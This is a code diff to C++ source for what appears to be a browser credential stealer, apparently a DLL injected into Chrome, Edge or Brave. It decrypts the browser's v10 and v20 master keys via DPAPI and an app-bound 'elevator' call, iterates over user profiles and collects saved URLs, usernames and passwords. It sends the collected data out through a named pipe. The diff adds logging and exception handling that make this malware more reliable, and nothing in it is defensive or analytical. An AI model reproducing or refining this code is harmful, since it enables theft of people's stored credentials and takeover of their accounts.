@@ -16,6 +16,20 @@
 using json = nlohmann::json;
 namespace fs = std::filesystem;
 
+void log_to_file(const std::string& msg) {
+    char* user_profile = nullptr;
+    size_t len = 0;
+    _dupenv_s(&user_profile, &len, "USERPROFILE");
+    if (user_profile) {
+        fs::path log_path = fs::path(user_profile) / "Desktop" / "extractor_log.txt";
+        std::ofstream log_file(log_path, std::ios::app);
+        if (log_file) {
+            log_file << "[" << GetTickCount() << "] " << msg << std::endl;
+        }
+        free(user_profile);
+    }
+}
+
 enum class Browser { Chrome, Edge, Brave };
 
 struct PasswordData { std::string url, username, password; };
@@ -198,20 +212,29 @@ Browser get_browser() {
 }
 
 void do_work() {
-    Browser browser = get_browser();
-    char* user_profile_env = nullptr;
-    size_t len = 0;
-    _dupenv_s(&user_profile_env, &len, "USERPROFILE");
-    if (!user_profile_env) return;
-    fs::path user_profile(user_profile_env);
-    free(user_profile_env);
+    try {
+        log_to_file("DLL Attached. Starting do_work()...");
+        Browser browser = get_browser();
+        log_to_file("Browser detected: " + std::to_string((int)browser));
 
-    fs::path data_path;
-    if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
-    else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-    else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        char* user_profile_env = nullptr;
+        size_t len = 0;
+        _dupenv_s(&user_profile_env, &len, "USERPROFILE");
+        if (!user_profile_env) {
+            log_to_file("Error: USERPROFILE env var not found.");
+            return;
+        }
+        fs::path user_profile(user_profile_env);
+        free(user_profile_env);
 
-    std::string local_state_str;
+        fs::path data_path;
+        if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
+        else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
+        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+
+        log_to_file("Data path: " + data_path.string());
+
+        std::string local_state_str;
     std::ifstream ls_file(data_path / "Local State");
     if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
 
@@ -222,7 +245,9 @@ void do_work() {
         std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
         auto decoded = base64_decode(key_b64);
         if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
+            log_to_file("Decrypting v10 key via DPAPI...");
             v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
+            log_to_file("v10 key retrieval: " + std::string(v10_key.empty() ? "FAILED" : "SUCCESS"));
         }
     }
 
@@ -232,9 +257,11 @@ void do_work() {
         else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
     }
     if (!v20_b64.empty()) {
+        log_to_file("Found app_bound_encrypted_key. Decrypting v20 key...");
         auto decoded = base64_decode(v20_b64);
         std::vector<unsigned char> blob = (decoded.size() > 4 && std::string((char*)decoded.data(), 4) == "APPB") ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
         v20_key = decrypt_with_elevator(blob, browser);
+        log_to_file("v20 key retrieval: " + std::string(v20_key.empty() ? "FAILED" : "SUCCESS"));
     }
 
     std::vector<std::string> profiles = { "Default" };
@@ -246,7 +273,10 @@ void do_work() {
     fs::path temp_dir = user_profile / "Desktop/chrome_db";
     fs::create_directories(temp_dir);
 
+    log_to_file("Starting profile iteration. Profiles found: " + std::to_string(profiles.size()));
+
     for (auto& profile : profiles) {
+        log_to_file("Processing profile: " + profile);
         fs::path p_path = data_path / profile;
         ProfileData p_data;
         p_data.name = profile;
@@ -370,10 +400,22 @@ void do_work() {
         Sleep(200);
     }
     if (h_pipe != INVALID_HANDLE_VALUE) {
+        log_to_file("Connected to named pipe. Sending data...");
         std::string s = collected.dump();
         DWORD written;
-        WriteFile(h_pipe, s.c_str(), s.size(), &written, nullptr);
+        if (WriteFile(h_pipe, s.c_str(), s.size(), &written, nullptr)) {
+            log_to_file("Data sent successfully: " + std::to_string(written) + " bytes.");
+        } else {
+            log_to_file("Error sending data via pipe: " + std::to_string(GetLastError()));
+        }
         CloseHandle(h_pipe);
+    } else {
+        log_to_file("Error: Could not connect to named pipe after 30 attempts.");
+    }
+    } catch (const std::exception& e) {
+        log_to_file("Exception in do_work: " + std::string(e.what()));
+    } catch (...) {
+        log_to_file("Unknown exception in do_work.");
     }
 }
 
